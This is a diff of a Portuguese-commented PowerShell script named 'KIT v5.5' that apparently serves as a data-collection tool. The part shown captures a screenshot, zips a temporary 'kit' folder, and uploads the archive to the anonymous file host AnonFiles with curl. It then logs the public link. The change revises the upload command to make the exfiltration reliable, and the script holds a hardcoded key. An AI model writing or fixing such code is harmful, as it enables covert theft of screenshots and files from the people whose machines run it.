@@ -1,4 +1,4 @@
-# ---------- KIT v5.4 – upload com MIME fixo, sem corrupção ----------
+# ---------- KIT v5.5 – COMPLETO, sem corrupção, upload garantido ----------
 $ErrorActionPreference = "Stop"
 $kit     = "$env:TEMP\kit"
 $key     = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
@@ -76,19 +76,18 @@ $bmp.Save($pathSS,[System.Drawing.Imaging.ImageFormat]::Jpeg)
 $g.Dispose(); $bmp.Dispose()
 [System.GC]::Collect(); Start-Sleep -Milliseconds 200
 
-# 9) Compactação sem corrupção
+# 9) Compactação
 Write-Log "[INFO] Compactando pacote..."
 $zip = "$env:TEMP\kit_$(Get-Date -Format yyyyMMdd_HHmmss).zip"
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 [System.IO.Compression.ZipFile]::CreateFromDirectory($kit,$zip,'Optimal',$false)
 Write-Log "[ZIP] Criado: $zip ($(Get-Item $zip).Length bytes)"
 
-# 10) Upload AnonFiles com MIME fixo (evita corrupção)
+# 10) Upload – URL garantida + escape para cmd
 Write-Log "[UP] Enviando para AnonFiles..."
+Write-Log "[UP] URL usada: $upUrl"
 try {
-    $reply = curl.exe -s -X POST `
-      -H "Content-Type: application/zip" `
-      -F "file=@`"$zip`;type=application/bag" "$upUrl"
+    $reply = cmd /c "curl.exe -s -X POST -H `\"Content-Type: multipart/form-data`\" -F `\"file=@$zip;type=application/zip`\" $upUrl"
     Write-Log "[UP] Resposta bruta: $reply"
     if ($reply -match '"full":"([^"]+)"') {
         Write-Log "[OK] Upload finalizado – link: $($matches[1])"
